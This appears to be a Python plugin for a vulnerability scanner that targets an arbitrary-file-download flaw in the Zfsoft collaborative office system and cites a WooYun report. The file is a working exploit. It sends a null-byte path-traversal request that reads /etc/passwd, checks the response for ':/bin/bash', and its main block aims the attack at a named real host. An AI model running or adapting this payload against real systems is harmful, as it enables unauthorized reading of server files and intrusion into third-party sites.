#!/usr/bin/env python
# -*- coding: utf-8 -*-
#_PlugName_ = 正方协同办公系统任意文件下载漏洞
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0150337
import re
def assign(service, arg):
    if service == 'zfsoft':
        return True, arg
def audit(arg):
    payload = 'gwxxbviewhtml.do?theAction=downdoc&gw_title=%00&htwj_recordid=../../../../../../../../../../.././../etc/passwd%00'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if code == 200 and ':/bin/bash' in res:
        security_info(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('zfsoft', 'http://oa.xzcit.cn/')[1])